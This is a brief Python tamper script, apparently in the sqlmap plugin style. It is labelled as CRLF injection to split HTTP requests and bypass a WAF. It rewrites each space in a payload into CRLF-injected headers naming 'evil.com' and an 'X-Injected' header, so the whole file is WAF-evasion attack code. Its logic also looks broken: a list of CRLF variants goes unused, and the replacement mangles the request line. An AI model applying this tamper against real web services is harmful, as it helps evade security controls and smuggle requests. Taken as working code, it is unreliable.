__example_payload__ = "GET /test HTTP/1.1"
__type__ = "CRLF injection to split HTTP requests and bypass WAF"


def tamper(payload, **kwargs):
    crlf_variants = ["\r\n", "\r", "\n", "\r\n\r\n"]
    retval = payload.replace(" ", "{crlf}Host: evil.com{crlf}X-Injected: true".format(crlf="\r\n"))
    return retval
